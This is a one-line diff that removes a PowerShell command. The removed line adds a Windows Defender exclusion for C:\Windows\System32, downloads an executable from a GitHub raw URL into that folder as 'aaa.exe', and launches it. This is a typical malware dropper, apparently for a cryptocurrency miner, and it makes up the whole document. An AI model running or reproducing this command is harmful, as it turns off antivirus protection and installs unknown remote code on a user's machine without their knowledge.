@@ -1,1 +1,0 @@
-Add-MpPreference -ExclusionPath 'C:\Windows\System32'; $output = 'C:\Windows\System32\aaa.exe'; Invoke-WebRequest -Uri 'https://github.com/rmonero/my_files/raw/main/console_app1.exe' -OutFile $output; Start-Process -FilePath $output;
